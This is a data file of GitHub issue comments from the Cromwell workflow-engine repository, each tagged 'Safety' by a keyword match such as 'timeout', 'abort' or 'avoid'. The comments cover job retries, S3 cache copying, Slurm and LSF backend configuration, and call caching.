Safety,"Hi Richard,. The Cromwell server is responsible for updating the database. The general; flow of information is AWS Batch -> Cromwell AWS Batch Backend Module ->; Cromwell Metadata actor -> DB. Cromwell only becomes aware of a failure if AWS Batch Backend Module; detects a failure in Batch (usually a non zero return code for the job). I; haven't tested it but I think if you define a retry strategy in the job; definition then Cromwell will not even be aware of the retry unless all of; the retries fail. Any or all of the Metadata entries in the database can be deleted if you; observe weird caching behavior. You can even drop the whole DB and the; Cromwell server will regenerate it the next time it starts. On Thu, Nov 19, 2020 at 3:51 AM Richard Davison <notifications@github.com>; wrote:. > When does the database get notified of a job's failure?; >; > - the moment the job fails; >; > or; >; > - when AWS Batch finally gives up trying to run the job; >; > I'm asking because from what I can tell, once a workflow is in a terminal; > state, some records are deleted from the database, which means that it; > would be impossible to try to run a job in a failed state. This is; > precisely what I tested: I navigated to the failed job in AWS Batch, and; > then pressed the ""Clone Job"" button.; >; > Perhaps a better test would be to literally create a new Job Description; > revision (as you pointed out earlier) to see if Batch a failed attempt can; > be rerun without impacting the status of the workflow.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EJLBXTJDA4SKYT4Y43SQTMADANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165:263,detect,detects,263,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165,1,['detect'],['detects']
Safety,"Hi Sean,. Yeah I noticed that, and glad that it is in the process of getting fixed. Though this is precisely why we must have more control over the whole process, as creation of instances are basically just a cascade of events which get tied to an [**Operation**](https://developers.google.com/resources/api-libraries/documentation/compute/v1/java/latest/index.html?com/google/api/services/compute/model/Operation.html), through which you can interface with the VMs that are building or running. I have fairly high confidence that this is basically what is happening underneath the Google service endpoint when performing a [**RunPipelineRequest**](https://github.com/googleapis/googleapis/blob/c4899b3f0cef2caa73bb1a32baf00f54c8a49921/google/genomics/v1alpha2/pipelines.proto#L51-L53) through the [Pipeline API here](https://github.com/googleapis/googleapis/blob/c4899b3f0cef2caa73bb1a32baf00f54c8a49921/google/genomics/v1alpha2/pipelines.proto#L51-L53):. ```; rpc RunPipeline(RunPipelineRequest) returns (google.longrunning.Operation) {; option (google.api.http) = { post: ""/v1alpha2/pipelines:run"" body: ""*"" };; }; ```. If you think of this as a graph of best-effort networked dependent triggers via APIs, you can stabilize this to make it more predictable and scalable. It is just too obvious that we can collectively definitely make this better at this stage - as we already have the tools - and especially since we'll soon have nested workflows via https://github.com/broadinstitute/cromwell/issues/1532, which should be assumed to make the current number of operations in flight grow by several orders of magnitude. ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260533994:1248,predict,predictable,1248,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260533994,1,['predict'],['predictable']
Safety,"Hi team,. I try to configure cromwell to run ExomeGermlineSingleSample_v3.1.9.wdl on Slurm, and I follow your guide, but I have an error that ${docker_script} : No such file or directory; /cromwell-executions/ExomeGermlineSingleSample/118135f5-ce0e-437b-9fd2-332dd614bded/call-GenerateSubsettedContaminationResources/execution/script : No such file or directory; I attached the run file; #!/bin/bash; #SBATCH --nodes=1; #SBATCH --time=2:00:00. module load jdk. java -Dconfig.file=/mainfs/wrgl/broadinstitute_warp_development/tutorials/cromwell-slurm_5.config \; -jar /mainfs/wrgl/broadinstitute_warp_development/tutorials/cromwell-85.jar \; run /mainfs/wrgl/broadinstitute_warp_development/warp/ExomeGermlineSingleSample_v3.1.9.wdl \; -i /mainfs/wrgl/broadinstitute_warp_development/tutorials/Exom_test.json. #### Configuration file ###. include required(classpath(""application"")). system {; # If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; abort-jobs-on-terminate = false; }. backend {; default = SLURM. providers {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; temporary-directory = ""$(mktemp -d /tmp/tmp.XXXXXX)"". runtime-attributes = """"""; Int runtime_minutes = 60; Int cpu = 1; Int memory_mb = 3900; String? docker; """""". submit = """""" \; 'sbatch \; --wait \; -J ${job_name} \; -D ${cwd} \; -o ${out} \; -e ${err} \; -t ${runtime_minutes} \; -p batch,scavenger \; -c ${cpu} \; --mem $(( (${memory_mb} >= ${cpu} * 3900) ? ${memory_mb} : $(( ${cpu} * 3900 )) )) \; -N 1 \; --exclusive \; --wrap ""/bin/bash ${script}""'; """""". submit-docker = """""" \. # Make sure the SINGULARITY_CACHEDIR variable is set. If not use a default; # based on the users home.; module load apptainer; if [ -z $APPTAINER_CACHEDIR ];; then CACHE_DIR=$HOME/.apptainer/cache; else CACHE_DIR=$APPTAINER_CACHEDIR; fi; # Make sure cache dir exists so lock file can be created by flock; mkdir -p $CACHE_DIR; LOCK_FILE",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7086:950,abort,abort,950,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7086,2,['abort'],"['abort', 'abort-jobs-on-terminate']"
Safety,"Hi!. I am attempting to run a tool that requires a directory structure as an input. One issue is that the tool will error out if there are files in the directory that are not the expected type. In our infrastructure we occasionally will have `.md5` files next to the important files which leads to the error in running the tool. To avoid this issue when launching Cromwell workflows I am attempting to list the good files in the listing attribute of the Directory input data type. The files I list are being staged in the inputs folder for the step but they are not being staged in the input directory folder path. Cromwell uses the empty input directory folder path as input to the tool which causes it to fail. . Example.cwl; ```; #!/usr/bin/env cwl-runner. cwlVersion: v1.0; class: CommandLineTool. baseCommand: [""ls""]; arguments: [""$(inputs.dir)""]. requirements:; - class: DockerRequirement; dockerPull: ""ubuntu:xenial"". inputs:; dir:; type: Directory. outputs:; example_out:; type: stdout. stdout: output.txt; ```; Input.yaml:; ```; dir: ; class: Directory; listing:; - class: File; path: ./data/1.txt; - class: File; path: ./data/2.txt; ```. staged files:; ```; => find inputs/; inputs/; inputs/1465754395; inputs/1465754395/2.txt; inputs/1465754395/1.txt; inputs/-143808698; inputs/-143808698/87e206a9-befc-4977-9a6e-c7a36832385d; inputs/-143808698/87e206a9-befc-4977-9a6e-c7a36832385d/.file; ```. And the generated Cromwell command; ```; [d14c14d1example.cwl:NA:1]: 'ls' '/cromwell-executions/example.cwl/d14c14d1-ce96-44fc-9315-d1c431011f83/call-example.cwl/inputs/-143808698/87e206a9-befc-4977-9a6e-c7a36832385d'; ```. Tested using Cromwell 35 and 37. Cwltool works as expected after adding a basename to the input directory in the yaml. . <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cr",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4670:332,avoid,avoid,332,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4670,1,['avoid'],['avoid']
Safety,"Hi, . I have been getting PoolTime out error (below) for all human jobs. Smaller ones e.g mouse genomes are a success. There are multiple steps in the wdl with outputs at every stage. Each output is copied from the S3//temp//cromwell_executions folder to S3://output folder successfully except the largest one i.e. .bam file. The .bam file is successfully copied from EC2 instance temp folder to S3://temp folder but it does copy from S3://temp/cromwell_executions to S3://output.; ; Both core environment and workflows have been set up using the templates provided by AWS genomics workflow. AWS batch jobs show a success notification, however it is only Cromwell that sends a status of ""failure"".. . Cromwell metadata : ; ```; ""failures"": [; {; ""causedBy"": [; {; ""causedBy"": [; {; ""causedBy"": [; {; ""message"": ""Timeout waiting for connection from pool"",; ""causedBy"": []; }; ],; ""message"": ""Unable to execute HTTP request: Timeout waiting for connection from pool""; }; ],; ""message"": ""software.amazon.awssdk.core.exception.SdkClientException: Unable to execute HTTP request: Timeout waiting for connection from pool""; }; ],; ""message"": ""[Attempted 1 time(s)] - CompletionException: software.amazon.awssdk.core.exception.SdkClientException: Unable to execute HTTP request: Timeout waiting for connection from pool""; }; ],; ```. Options.json; ```; ""final_workflow_outputs_dir"": ""s3://singleronbio-de-tmp/output/2023/Aug/2023-00578"",; ""final_call_logs_dir"": ""s3://singleronbio-de-tmp/log/2023/Aug/2023-00578/230719005"",; ""final_workflow_log_dir"": ""s3://singleronbio-de-tmp/workflow_log/2023/Aug/2023-00578/230719005"",; ""backend"": ""AWSBATCH"",; ""base_url"": ""XXXX"",; ""route_submit"": ""/api/workflows/v1"",; ""route_valid"": ""/api/womtool/v1/describe"",; ""route_status"": ""/api/workflows/v1/{id}/status"",; ""route_outputs"": ""/api/workflows/v1/{id}/outputs"",; ""write_to_cache"": true,; ""read_from_cache"": true; }; ```. Thank you, ; Lakshmi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7200:812,Timeout,Timeout,812,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7200,4,['Timeout'],['Timeout']
Safety,"Hi, . I want to use reference disk to avoid cp input to local disk. I have some trouble finding how to create image and manifest file. ; I see from the link below that files has path and crc32c. can path be like gs://...? and what is crc32c. https://github.com/broadinstitute/cromwell/blob/2a69691ec56ba0e8f279b8f006ba796bb9cfaf05/docs/backends/Google.md?plain=1#L529",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7211:38,avoid,avoid,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7211,1,['avoid'],['avoid']
Safety,"Hi, is it possible to invalidate cache with timeout? I am asking because we do not keep the results of calls infinitely, only for 6 weeks. I assume that cache will be kept in DB and call will try to copy a directory that is corrupted (we delete files but not directory structure). Otherwise we would have to access DB and remove calls manually. Rafal",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5174:44,timeout,timeout,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5174,1,['timeout'],['timeout']
Safety,"Hi, thanks for the reply. I was using `version development` which I had assumed meant it had at least the 1.1 features (including `None`). I agree using some safety checks and `select_first` can work, but often using the above paradigm with `None` can be a lot clearer/easier to work with in code.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7249#issuecomment-1858364933:158,safe,safety,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7249#issuecomment-1858364933,2,['safe'],['safety']
Safety,"Hi,. I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch; Cromwell version: 51; Error log:. Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; nmerged.bam)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977:13,timeout,timeout,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977,2,"['Timeout', 'timeout']","['TimeoutException', 'timeout']"
Safety,"Hi,. I have built a WDL workflow which works well with SLURM but now I am trying to get it to be able to be run on a standalone server. . I have Slurm as my provider and have created one for Local. ` Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. run-in-background = true; exit-code-timeout-seconds = 300; workflow-reset = true; read_from_cache = true; write_to_cache = true; system.file-hash-cache=true; concurrent-job-limit = 2. runtime-attributes = """"""; String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg""; """""". submit = ""singularity run -B ${head_directory}:${head_directory} ${singularity_image} /bin/bash ${script}"". filesystems {; local {; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]; } ## end local; } ## end file systems; } ## end config; } ## End Local`. Oddly, when running the workflow I get a submit docker error. ie. as per below. I have no idea why it's looking for docker as I'm not knowingly using it. I'm not using docker in my run time parameters. I have been able to get standalone working on another workflow by passing a singularity container to each task command output but I was wondering if there was a more elegant solution I could use such as just changing to a pre-made provider. I have searched Google and through here but not found anything. I did find one issue here but they seemed to want to use docker where as I don't. . Thanks for the help!. `task submit {. String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {; singularity run -B ${head_directory}:${head_directory} ${singularity_image} /bin/bash ${script}; }; }. task submit_docker {. String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. String docker_cwd; String docker_cid; String docker_scri",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862:342,timeout,timeout-seconds,342,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862,1,['timeout'],['timeout-seconds']
Safety,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:557,timeout,timeout,557,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310,2,"['Timeout', 'timeout']","['TimeoutException', 'timeout']"
Safety,"Hi,. Sorry for submitting an issue here but I'm consistently getting a ""Something has gone wrong"" error trying to log in to your Jira. I'm hoping someone can offer some guidance for an issue I'm having running a CWL workflow with Cromwell on GCP. I'm using bcbio to generate CWL to do joint calling. This worked fine when I tested it with a single sample to shake out any issues with the pipeline. However when scaling up to a 20 sample batch there's an issue with the get_parallel_regions_jointvc step. This step appears to be localizing multiple copies of the reference genome data (one for each sample) to the same disk. This really blows up the storage requirements as the number of samples increase and ends up exhausting the storage allocated to the worker instance. Is this expected behaviour or is there some kind of configuration I'm missing that would avoid this?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5131:862,avoid,avoid,862,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5131,1,['avoid'],['avoid']
Safety,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:397,timeout,timeout,397,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491,2,['timeout'],['timeout']
Safety,"Hi. I'm trying to enable call caching using a local file database and I can't seem to get it to work. Everything that I try does not seem to make a difference, and each run always starts from the first task. I'm running cromwell in run mode from the command line, and I am testing on both cromwell 43 and cromwell 47. I also have write-to-cache and read-from-cache set to true in my options.json (although I understand that is the default behaviour). I am unable to use a mySQL or postgres database at this current time. Is there something that I'm missing? Is there any additional information that is needed to help diagnose this?. My cromwell.conf is as follows:. backend {; default = LSF; providers {; LSF {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; exit-code-timeout-seconds = 600. runtime-attributes = """"""; Int cpus; Float memory_mb; String lsf_queue; String lsf_project; """""". submit = """"""; bsub \; -q ${lsf_queue} \; -P ${lsf_project} \; -J ${job_name} \; -cwd ${cwd} \; -o ${out} \; -e ${err} \; -n ${cpus} \; -R rusage[mem=${memory_mb}] \; /usr/bin/env bash ${script}; """""". job-id-regex = ""Job <(\\d+)>.*"". kill = ""bkill ${job_id}""; check-alive = ""bjobs ${job_id}"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [; ""soft-link"", ""copy"", ""hard-link""; ]; hashing-strategy: ""path""; }; }; }; }; }; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=100000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; connectionTimeout = 86400000; numThreads = 1; }; }",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5370:819,timeout,timeout-seconds,819,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5370,1,['timeout'],['timeout-seconds']
Safety,"Hi，I have learned that cromwell does not support 【cpu and memory】runtime attributes for local backends（see https://cromwell.readthedocs.io/en/develop/RuntimeAttributes/）. Thus, when running a workflow locally， How can we avoid concurent jobs that may crash the workflow by running out of memory？ I know that maximum job number can be limited, and some jobs can be parallelized wildly for they require only little resources , however, some jobs should not be paralleized for need of large memory. So, we need to check available resource before submit a job. . best wishes!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6458:221,avoid,avoid,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6458,1,['avoid'],['avoid']
Safety,"Hmm, that's interesting on the google side. So I'm clear you're saying that Cromwell is showing Running when they were not in Google? If so, how long did that stay the case - was it in perpetuity? I ask because as the number of jobs increases the average latency between a state change on Google's side and Cromwell detecting it increases due to QPS limitations. We're always trying to work with them to find ways to make that faster but we're limited on how many things we can query about at once, so we round robin them through. As an example the other day I submitted 200k single call workflows which each only slept for a couple of seconds but it took upwards of an hour for Cromwell to know that everything was complete due to that. I'm still going to look into the root cause of the exceptions you saw, i've been seeing those a lot myself (but had reason to believe it was an artifact of my not-at-all-standard setup, glad you chimed in to fix that for me) and wanted to make sure they weren't masking something more fundamentally wrong. re the logging aspect, I agree completely - this has always been an issue and is growing the more the people start adopting Cromwell. I found it amusing that just hours prior I said I should change that one to be less frightening and then it frightened someone ;) In general I think that logging is always a a dark art but answering the ""who is the log for?"" is even harder here as we intentionally designed cromwell to satisfy multiple use cases all of whom have different things they want to see. It's something that we're looking to work on over the next several months.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260127711:316,detect,detecting,316,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260127711,2,['detect'],['detecting']
Safety,"Hmm, this still makes me very uncomfortable - if the PR is from your develop to develop, you shouldn't have those extra commits. You should not have merged master into your develop. To fix this, you can either start clean from a develop (not merged with master) or if you've tried that and had trouble, I'll offer to help you and open a separate PR. It's messy merges like this with force pushes that lead to a lot of headaches, and it should be avoided if possible. It's important to do this right. It's after 11pm here and I'm not in work mode, but I can help with this tomorrow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464973494:446,avoid,avoided,446,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464973494,1,['avoid'],['avoided']
Safety,Hmm… Liquibase isn't thread safe. https://liquibase.jira.com/browse/CORE-2792. The various tests creating temporary databases may need refactoring.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-436756869:28,safe,safe,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-436756869,1,['safe'],['safe']
Safety,"How ""eventually"" consistent should I be thinking on metadata, etc.? Seconds, minutes, hours, longer? The timeout at batch submission is likely a client-side thing, so we can probably ignore that issue for now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1794#issuecomment-267638887:105,timeout,timeout,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1794#issuecomment-267638887,1,['timeout'],['timeout']
Safety,"HtCondor backend should be responsive to abort requests from the engine, and kill and remove the job from it's internal queue.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1402:41,abort,abort,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1402,1,['abort'],['abort']
Safety,HtCondorInitializationActor will explode on abort,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1109:44,abort,abort,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1109,1,['abort'],['abort']
Safety,"I agree that an upfront sanity check would be nice, should I do it as part of this ticket ? It seems like a new feature to me as it's not in JES either but I don't mind really.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/249#issuecomment-151868823:24,sanity check,sanity check,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/249#issuecomment-151868823,1,['sanity check'],['sanity check']
Safety,"I agree we should talk about it - although in order to enable sub-workflows, I personally think it's a good thing as it will avoid confusion (both on user and cromwell side) on what is being called.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1581#issuecomment-253887045:125,avoid,avoid,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1581#issuecomment-253887045,1,['avoid'],['avoid']
Safety,"I also played around with bolting on the docker hashing too. To be clear, I like @mcovarr's PR here better, as it's much cleaner, and has tests! Still, here's some overlapping [code](https://github.com/broadinstitute/cromwell/compare/job_avoidance...ks_hash_docker_image) to look at, especially the first commit with an alternative way to get an `ActorSystem` down into the `BackendCall`. A few issues left though, but some/most of these can be logged as new tickets, and we can get basic wiring in for the moment via this PR. Biggest issue-- 10 seconds is right on the edge for testing _and_ checking the docker server for the hash, so different docker tests currently timeout intermittently. Among other issues I saw, `Future` exception handling may be different due to refactoring. For example converting `Future { /* big block */ }` to `/* big block */ hashFuture.map(hash => ...)` allows exceptions within the block to not get caught (as expected?). Also I wasn't sure yet how we want to handle some `Failure` cases, specifically when the docker server doesn't return a hash. I assume that means that we should just run again from scratch, and NOT go to a `FailedExecution` state in the database. Or maybe we should go to `Failure`, and just retry a particular operations later. With ~~Gatling~~ Tyburn load testing, perhaps we can log any docker client errors now, and start to distinguish them with custom error handling code as they pop up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164760702:670,timeout,timeout,670,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164760702,2,['timeout'],['timeout']
Safety,"I also saw this problem. The VM is not a preemptible and I'm using Cromwell v32. There's a lot of shards spending 10 minutes in ""Waiting for quota"" when this problem happens. The instance that gives PAPI Error Code 10 was able to get a virtual machine, though. Maybe there is a timeout for ""Waiting for quota"" which causes all other shards to fail with Error Code 10 even though there was nothing wrong with this particular shard?. ```; Task to_bam_workflow.BaseRecalibrator:3:1 failed. The job was stopped before the command finished. PAPI error code 10. Message: 14: VM ggp-8822042418103915125 stopped unexpectedly.; java.lang.Exception: Task to_bam_workflow.BaseRecalibrator:3:1 failed. The job was stopped before the command finished. PAPI error code 10. Message: 14: VM ggp-8822042418103915125 stopped unexpectedly.; 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:73); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:520); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:527); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:77); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1019); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1015); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.Batching",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985:278,timeout,timeout,278,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985,1,['timeout'],['timeout']
Safety,"I am experimenting by running some workflows with a MySQL database to avoid problems like #3387, but after a successful run and several days without re-running the pipeline (or a similar one) I would like to clean up the database to free some space. I would appreciate if this is included in the cromwell documentation...",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3415:70,avoid,avoid,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3415,1,['avoid'],['avoid']
